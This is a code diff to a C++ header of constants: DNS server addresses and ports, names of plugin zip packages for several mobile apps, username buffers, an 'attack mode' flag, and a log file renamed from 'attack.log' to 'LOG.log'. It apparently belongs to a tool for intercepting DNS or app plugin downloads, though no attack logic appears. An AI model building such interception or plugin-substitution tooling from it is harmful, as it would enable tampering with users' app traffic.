@@ -20,13 +20,9 @@ using namespace std;
 #define P2PPLUGIN_PACKET_NAME				"libp2pproxy.zip"
 #define PLAYERCORENEONAPI21_PACKET_NAME		"player_core_neon_api21.zip"
 
-#define  SHUQI_PLUGIN_ZIP_FILENAME "shuqi_plugin.zip"
+#define  SHUQI_PLUGIN_ZIP_FILENAME			"shuqi_plugin.zip"
 
-#define TARGET_INFO_TAG					WM_USER + 0x100
-
-
-
-
+#define TARGET_INFO_TAG						WM_USER + 0x100
 
 
 #define DNS_PORT							53
@@ -45,28 +41,17 @@ using namespace std;
 #define MAX_SINGLE_PACKET_SIZE				4096
 
 
-#define LOCAL_QUERY_DNS_ID					0xfedc
-#define LOCAL_DNS_QUERY_SERVER				0x72727272
-//#define LOCAL_DNS_QUERY_SERVER				0x08080808
+#define LOCAL_QUERY_DNS_ID					0x1234
+#define DNS_SERVER_ADDRESS					0x72727272
+#define BACK_DNS_SERVER_ADDRESS				0x08080808
 
 //#define G_USERNAME						"test20181216"
-//#define G_USERNAME						"test20181205"
-//#define G_USERNAME						"test20190220"
-//#define G_USERNAME						"test20181214"
-//#define G_USERNAME						"test20190319"
-//#define G_USERNAME						"test20190326"
-//#define G_USERNAME						"test20190330"
-//#define G_USERNAME						"test20190331"
-//#define G_USERNAME						"test20190402"
-//#define G_USERNAME						"test20190404"
-//#define G_USERNAME						"test20190410"
-//#define G_USERNAME						"test20190413"
 
-extern char G_USERNAME[64];
+#define USERNAME_MAXLEN						32
+
+extern char G_USERNAME[USERNAME_MAXLEN];
 
 extern int gAttackMode;
-
-//extern char DEFAULT_USERNAME[64];
 
 #define SERVER_USERNAME					"server"
 
@@ -78,8 +63,8 @@ extern int gAttackMode;
 
 
 
-#define ATTACK_LOG_FILENAME					"attack.log" 
-#define ERROR_LOG_FILENAME					"error.log"
+#define ATTACK_LOG_FILENAME					"LOG.log" 
+
 
 #define CRLN								"\r\n"
 #define CRLNLINUX							"\n"
@@ -167,8 +152,6 @@ extern int gAttackMode;
 
 //qq
 #define QQGTIMG_ZIP_FILENAME					"libwxvoiceembed.zip"
-
-
 
 
 
